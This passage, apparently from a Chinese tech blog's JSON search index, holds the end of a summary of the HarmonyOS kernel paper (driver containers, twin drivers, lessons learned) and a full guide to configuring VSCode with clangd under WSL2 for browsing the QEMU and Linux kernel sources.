能够找到合适的驱动容器来完成处理。\n\n基于驱动容器的方法，鸿蒙内核成功复用了超过 700 个 Linux 设备驱动，大部分驱动都可以无需修改直接正常工作，少部分执行了特权指令（如 smc）的驱动无法正常工作（因为驱动容器运行在用户态），这些驱动需要进行手动适配。\n此外，鸿蒙内核还在原生驱动容器中引入了 twin driver 的设计，它将控制平面与数据平面分离以提升关键路径的性能。具体来说，它重写了数据处理的例程，以便它可以被施加更弱的隔离机制（运行在 IC1 而不是 IC2），带来性能的提升。而控制平面这样包含复杂例程（如 init/resume 等）的仍然运行在 IC2 中。这样的分离设计也会带来状态同步等复杂的问题，因此它只用在一些性能关键的驱动中，如 UFS 驱动。\n总结鸿蒙内核的 core kernel 在 C 语言的一些限制子集中实现，总共包含约 9w 行代码。各操作系统服务之间相互解耦，可以单独部署，总代码量超过 100w 行。鸿蒙内核的构建系统可以根据各场景来配置和组装操作系统服务，包括前面提到的多个服务之间组合。\n经过前文的设计描述可以看到，鸿蒙内核作为一个商用的通用内核，不同于那些更偏学术的 SOTA 微内核，可谓处处充满了 trade-off。性能分析的部分本文就不再具体分析了，感兴趣的可以前往阅读原文，最后以论文第七章——Lessons and Experiences 的小结来结束本文的内容：\n\n首先实现兼容，然后逐渐过渡到原生。\n仅有技术规范是不够的，还需要通过大规模测试来检验兼容性。\n先部署，然后再持续优化。\n尽可能使用自动化验证技术。\n规模效应可能会导致的硬件故障/缺陷被放大。\n大（粗粒度）内核锁在新兴领域下缺乏可扩展性。\n\n","categories":["操作系统"],"tags":["操作系统","OpenHarmony"]},{"title":"使用VSCode+clangd插件配置C项目IDE环境","url":"/2026/02/09/%E4%BD%BF%E7%94%A8VSCode+clangd%E6%8F%92%E4%BB%B6%E9%85%8D%E7%BD%AEC%E9%A1%B9%E7%9B%AEIDE%E7%8E%AF%E5%A2%83/","content":"本文将介绍如何在 WSL2 环境下，利用 VSCode 结合 clangd 插件，构建一个能够高效美观地阅读大型 C 项目的 IDE 环境。clangd 插件版本为 0.4.0，本地 clangd 后端版本为 18.1.3。\n\n基本配置WSL2 配置的基本流程如下所示：\n\n（如果启用）禁用 Microsoft 的 C/C++ 扩展中的 IntelliSense 功能，防止冲突。\n扩展应用商店安装 clangd 插件。\n在 WSL2 中安装 clangd 后端：sudo apt install clangd。\n创建 compile_commands.json。\n在项目根目录下创建 .clangd 配置文件进行进一步调整。\n\n在此简单解释一下 compile_commands.json 和 .clangd 配置文件的作用：compile_commands.json 存储着项目的编译命令，clangd 正式根据该命令列表推断出不同源代码之间的关系，实现符号跳转的功能；而 .clangd 则相当于一个“微调选项”，对项目的 clangd 分析工具进行进一步调整。\n接下来，我将介绍我平常接触较多的两个项目——Linux 内核和 QEMU，来介绍具体的配置方法。\nQEMU生成编译命令QEMU 下可以通过编译前的配置（configure）来生成编译命令：如下所示：\n./configure --target-list=x86_64-softmmu\n这样文件 compile_commands.json 就生成在了 build 目录下。\n编写配置文件接下来编写 .clangd 配置文件，首先需要通过 CompilationDatabase 选项指定 compile_commands.json 文件所在的目录，即 build。另外，由于像 QEMU 和 Linux 内核这种 20 年以上历史、几百万上千万行代码的大型项目，由于 VSCode 的 clangd 插件又是基于单文件分析，因此会遇到很多稀奇古怪的警告和错误，体现在 VSCode 中就是黄色和红色的波浪线，但其实项目本身编译起来并没有什么问题… 因此我的选择是：\n\n保留符号跳转等提示功能。\n禁用所有的警告和错误分析。\n\n虽然这样会降低一定的功能性，但相比我原本的 vim + ctags 的解决方案还是要现代太多了。总之，QEMU 的配置文件如下所示：\nCompileFlags:  CompilationDatabase: &quot;build&quot;  Add: [-w, -ferror-limit=0]Diagnostics:  Suppress: [&quot;*&quot;]  ClangTidy:    Remove: [&quot;*&quot;]Index:  Background: Build\nLinux生成编译命令Linux 内核的 Makefile 中准备了一个专门的生成编译命令的选项：如下所示：\nmake compile_commands.json -j$(nproc)\n生成的 compile_commands.json 直接就在项目根目录下。\n编写配置文件接下来编写 .clangd 配置文件，基本的配置和 QEMU 类似，区别第一在于 compile_commands.json 文件的位置为根目录；另外，由于我使用的是 gcc 编译，会遇到一些 gcc 专用的编译优化选项，clangd 无法识别，需要在 CompileFlags::Remove 中手动将其移除，如果使用是 clang 进行编译，可能不会遇到该问题。\nCompileFlags:  CompilationDatabase: &quot;.&quot;  Remove:    - -m*    - -fno-delete-null-pointer-checks    - -fno-allow-store-data-races    - -fconserve-stack    - -fpatchable-function-entry=*    - -ftrivial-auto-var-init=*    - -fstrict-flex-arrays=*    - -fno-stack-clash-protection    - -fcf-protection=*    - -fno-jump-tables    - -fno-omit-frame-pointer    - -mindirect-branch=*    - -mfunction-return=*    - --param=*  Add: [-w, -ferror-limit=0]Diagnostics:  Suppress: [&quot;*&quot;]  ClangTidy:    Remove: [&quot;*&quot;]Index:  Background: Build\n我上述的 Remove 列表可能并不全面，如果后面遇到部分源文件仍然提示了错误提示，可以使用 Claude Code 等 Agent 进一步对其进行完善。\n","categories":["经验"],"tags":["经验","C","Linux","QEMU"]}]